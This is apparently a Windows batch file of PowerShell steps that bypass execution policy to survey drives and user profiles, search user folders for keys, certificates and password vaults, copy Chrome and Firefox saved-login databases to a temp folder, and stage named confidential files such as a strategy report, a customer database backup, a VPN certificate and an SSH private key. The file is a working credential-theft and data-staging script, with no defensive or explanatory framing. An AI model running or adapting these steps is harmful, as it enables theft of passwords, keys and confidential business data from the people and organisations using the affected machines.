steps.cmd:
powershell -ep bypass -c "
$drives = Get-PSDrive -PSProvider FileSystem | Select-Object Name, @{N='Free(GB)';E={[math]::Round($_.Free/1GB,2)}}, @{N='Used(GB)';E={[math]::Round($_.Used/1GB,2)}};
$userDirs = Get-ChildItem C:\Users -Directory | Select-Object Name, LastWriteTime;
Write-Host '=== Drive Info ===';
$drives | Format-Table -AutoSize;
Write-Host '=== User Profiles ===';
$userDirs | Format-Table -AutoSize"

powershell -ep bypass -c "
$results = @();
$extensions = @('*.docx','*.xlsx','*.pdf','*.pptx','*.pem','*.key','*.pfx','*.kdbx');
foreach($ext in $extensions) {
  $files = Get-ChildItem -Path C:\Users -Recurse -Include $ext -ErrorAction SilentlyContinue;
  foreach($f in $files) {
    $results += [PSCustomObject]@{Name=$f.Name; Path=$f.FullName; Size=[math]::Round($f.Length/1KB,1); Modified=$f.LastWriteTime};
  }
}
$results | Sort-Object Size -Descending | Select-Object -First 10 | Format-Table -AutoSize"

powershell -ep bypass -c "
# Browser credential extraction
$chromeLoginDB = 'C:\Users\{userName}\AppData\Local\Google\Chrome\User Data\Default\Login Data';
$firefoxProfile = Get-ChildItem 'C:\Users\{userName}\AppData\Roaming\Mozilla\Firefox\Profiles\' -Directory | Select-Object -First 1;
Copy-Item $chromeLoginDB -Destination 'C:\Windows\Temp\chrome_logins.db' -Force;
Copy-Item \"$($firefoxProfile.FullName)\logins.json\" -Destination 'C:\Windows\Temp\ff_logins.json' -Force;
Write-Host 'Browser credential files copied to staging';
Get-ChildItem C:\Windows\Temp\*logins* | Format-Table Name, Length, LastWriteTime -AutoSize"

powershell -ep bypass -c "
# Collect sensitive files to staging directory
$stage = 'C:\Windows\Temp\collect_' + (Get-Date -Format 'yyyyMMdd');
New-Item -ItemType Directory -Path $stage -Force | Out-Null;
$targets = @(
  'C:\Users\{userName}\Documents\2026_전략보고서.xlsx',
  'C:\Users\{userName}\Desktop\고객_DB_백업.xlsx',
  'C:\Users\svc_backup\Documents\VPN_인증서.pfx',
  'C:\Users\{userName}\.ssh\SSH_private.key',
  'C:\Users\{userName}\Documents\password_vault.kdbx'
);
foreach($t in $targets) { Copy-Item $t -Destination $stage -Force; };
Write-Host \"Files staged at: $stage\";
Get-ChildItem $stage | Format-Table Name, @{N='KB';E={[math]::Round($_.Length/1KB,1)}} -AutoSize"
